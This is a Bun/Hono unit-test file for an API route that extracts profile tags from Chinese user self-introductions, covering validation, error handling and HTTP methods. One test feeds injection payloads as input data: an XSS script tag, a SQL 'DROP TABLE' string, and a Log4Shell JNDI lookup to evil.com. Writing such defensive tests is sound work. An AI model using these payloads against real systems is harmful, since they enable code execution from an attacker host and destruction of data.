import { describe, it, expect, beforeEach, afterEach, mock } from 'bun:test';
import { Hono } from 'hono';
import { zValidator } from '@hono/zod-validator';
import router from '../src/routes/v1/extract.route';
import * as tagService from '../src/services/tag.service';
import { logger } from '../src/config/logger';
import { ExtractUserProfileTagSchema } from '../src/types/user.profile.type';

// Mock dependencies
mock.mock('../src/services/tag.service', () => ({
  extractUserProfileTags: mock.fn(),
}));

mock.mock('../src/config/logger', () => ({
  logger: {
    info: mock.fn(),
    error: mock.fn(),
    warn: mock.fn(),
  }
}));

describe('Extract Route Tests', () => {
  let app: Hono;

  beforeEach(() => {
    app = new Hono();
    app.route('/v1/extractUserProfileTags', router);
    mock.clearAllMocks();
  });

  afterEach(() => {
    mock.restoreAllMocks();
  });

  describe('POST /', () => {
    const validPayload = {
      user_id: '123e4567-e89b-12d3-a456-426614174000',
      user_introduces: '我是一名软件工程师，在北京工作，喜欢编程和阅读技术书籍。',
      user_sex: '男' as const,
      user_age: 30
    };

    const mockServiceResponse = {
      tags: ['软件工程师', '北京', '编程', '技术书籍', '阅读']
    };

    it('should successfully extract user profile tags with valid payload', async () => {
      // Mock successful service response
      mock.mock(tagService.extractUserProfileTags).mockResolvedValue(mockServiceResponse);

      const res = await app.request('/v1/extractUserProfileTags', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(validPayload)
      });

      expect(res.status).toBe(200);
      const json = await res.json();
      expect(json).toMatchObject({
        code: 200,
        message: 'ok',
        data: mockServiceResponse
      });

      expect(tagService.extractUserProfileTags).toHaveBeenCalledWith(validPayload);
      expect(logger.info).toHaveBeenCalledWith('Service Execution Success', {
        output: mockServiceResponse
      });
    });

    it('should validate user_id as UUID format', async () => {
      const invalidPayload = {
        ...validPayload,
        user_id: 'invalid-uuid'
      };

      const res = await app.request('/v1/extractUserProfileTags', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(invalidPayload)
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json).toMatchObject({
        code: 400,
        message: '参数校验失败',
        data: null
      });

      expect(tagService.extractUserProfileTags).not.toHaveBeenCalled();
    });

    it('should validate user_introduces is not empty', async () => {
      const invalidPayload = {
        ...validPayload,
        user_introduces: ''
      };

      const res = await app.request('/v1/extractUserProfileTags', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(invalidPayload)
      });

      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.code).toBe(400);
      expect(json.message).toBe('参数校验失败');
    });

    it('should validate user_sex enum values', async () => {
      const invalidSexValues = ['male', 'female', '未知', ''];
      
      for (const sex of invalidSexValues) {
        const invalidPayload = {
          ...validPayload,
          user_sex: sex
        };

        const res = await app.request('/v1/extractUserProfileTags', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(invalidPayload)
        });

        expect(res.status).toBe(400);
        const json = await res.json();
        expect(json.code).toBe(400);
      }
    });

    it('should accept all valid user_sex values', async () => {
      const validSexValues = ['男', '女', '其他'] as const;
      mock.mock(tagService.extractUserProfileTags).mockResolvedValue(mockServiceResponse);

      for (const sex of validSexValues) {
        const validPayload = {
          user_id: '123e4567-e89b-12d3-a456-426614174000',
          user_introduces: '测试用户介绍',
          user_sex: sex,
          user_age: 25
        };

        const res = await app.request('/v1/extractUserProfileTags', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(validPayload)
        });

        expect(res.status).toBe(200);
        const json = await res.json();
        expect(json.code).toBe(200);
      }
    });

    it('should validate user_age range (1-150)', async () => {
      const invalidAges = [0, -1, 151, 200, 999];
      
      for (const age of invalidAges) {
        const invalidPayload = {
          ...validPayload,
          user_age: age
        };

        const res = await app.request('/v1/extractUserProfileTags', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(invalidPayload)
        });

        expect(res.status).toBe(400);
        const json = await res.json();
        expect(json.code).toBe(400);
      }
    });

    it('should accept valid user_age values', async () => {
      const validAges = [1, 18, 25, 65, 100, 150];
      mock.mock(tagService.extractUserProfileTags).mockResolvedValue(mockServiceResponse);

      for (const age of validAges) {
        const validPayload = {
          user_id: '123e4567-e89b-12d3-a456-426614174000',
          user_introduces: '测试用户介绍',
          user_sex: '男' as const,
          user_age: age
        };

        const res = await app.request('/v1/extractUserProfileTags', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(validPayload)
        });

        expect(res.status).toBe(200);
        const json = await res.json();
        expect(json.code).toBe(200);
      }
    });

    it('should handle missing required fields', async () => {
      const requiredFields = ['user_id', 'user_introduces', 'user_sex', 'user_age'];
      
      for (const field of requiredFields) {
        const incompletePayload = { ...validPayload };
        delete incompletePayload[field];

        const res = await app.request('/v1/extractUserProfileTags', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(incompletePayload)
        });

        expect(res.status).toBe(400);
        const json = await res.json();
        expect(json.code).toBe(400);
        expect(json.message).toBe('参数校验失败');
      }
    });

    it('should handle service errors gracefully', async () => {
      const errorMessage = 'Service unavailable';
      mock.mock(tagService.extractUserProfileTags).mockRejectedValue(new Error(errorMessage));

      const res = await app.request('/v1/extractUserProfileTags', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(validPayload)
      });

      expect(res.status).toBe(500);
      const json = await res.json();
      expect(json).toMatchObject({
        code: 500,
        message: errorMessage,
        data: null
      });
    });

    it('should handle malformed JSON request body', async () => {
      const res = await app.request('/v1/extractUserProfileTags', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: 'invalid json{'
      });

      expect(res.status).toBe(400);
    });

    it('should handle empty request body', async () => {
      const res = await app.request('/v1/extractUserProfileTags', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: ''
      });

      expect(res.status).toBe(400);
    });

    it('should handle non-JSON content type', async () => {
      const res = await app.request('/v1/extractUserProfileTags', {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: 'some text data'
      });

      expect(res.status).toBe(400);
    });

    it('should validate string fields against injection attempts', async () => {
      const maliciousPayloads = [
        { ...validPayload, user_introduces: '<script>alert("xss")</script>' },
        { ...validPayload, user_introduces: '"; DROP TABLE users; --' },
        { ...validPayload, user_introduces: '${jndi:ldap://evil.com/a}' },
      ];

      for (const payload of maliciousPayloads) {
        mock.mock(tagService.extractUserProfileTags).mockResolvedValue(mockServiceResponse);
        
        const res = await app.request('/v1/extractUserProfileTags', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        // Should accept the data (validation passes) but service should handle sanitization
        expect(res.status).toBe(200);
        expect(tagService.extractUserProfileTags).toHaveBeenCalledWith(payload);
      }
    });

    it('should handle very long user_introduces', async () => {
      const longIntroduction = 'a'.repeat(10000);
      const payload = {
        ...validPayload,
        user_introduces: longIntroduction
      };

      mock.mock(tagService.extractUserProfileTags).mockResolvedValue(mockServiceResponse);

      const res = await app.request('/v1/extractUserProfileTags', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      expect(res.status).toBe(200);
      expect(tagService.extractUserProfileTags).toHaveBeenCalledWith(payload);
    });

    it('should handle edge case UUID values', async () => {
      const edgeUUIDs = [
        '00000000-0000-0000-0000-000000000000',
        'ffffffff-ffff-ffff-ffff-ffffffffffff'
      ];

      for (const userId of edgeUUIDs) {
        const payload = {
          ...validPayload,
          user_id: userId
        };

        mock.mock(tagService.extractUserProfileTags).mockResolvedValue(mockServiceResponse);

        const res = await app.request('/v1/extractUserProfileTags', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        expect(res.status).toBe(200);
        expect(tagService.extractUserProfileTags).toHaveBeenCalledWith(payload);
      }
    });

    it('should only accept POST method', async () => {
      const methods = ['GET', 'PUT', 'DELETE', 'PATCH'];
      
      for (const method of methods) {
        const res = await app.request('/v1/extractUserProfileTags', {
          method,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(validPayload)
        });

        expect(res.status).toBe(404);
      }
    });
  });
});